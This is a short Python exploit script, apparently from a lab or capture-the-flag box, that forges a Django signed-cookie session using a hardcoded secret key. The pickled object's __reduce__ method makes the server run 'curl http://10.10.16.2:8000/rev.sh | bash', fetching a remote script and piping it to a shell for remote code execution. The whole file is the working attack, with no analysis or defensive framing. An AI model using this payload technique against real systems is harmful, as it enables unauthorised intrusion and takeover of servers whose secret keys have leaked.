#!/usr/bin/python3
import os
import subprocess
import pickle
from django.core import signing
from django.contrib.sessions.serializers import PickleSerializer
# Declare settings for Django. They can be empty. We set it as "app.settings" since the
# directory we have put the files is named "app"
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "app.settings")


class PickleSerializer(object):

    def dumps(self, obj):
        return pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)

    def loads(self, data):
        return pickle.loads(data)


class Exploit(object):
    def __reduce__(self):
        return (subprocess.Popen, (
            ("curl http://10.10.16.2:8000/rev.sh | bash"),  
            0,  
            None,  
            None,  
            None,  
            None,  
            None,  
            False, 
            True,  
        ))


cookie = signing.dumps(
    Exploit(),
    key='55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b',
    salt='django.contrib.sessions.backends.signed_cookies',
    serializer=PickleSerializer,
    compress=True
)


print("[+] Cookie:", cookie)
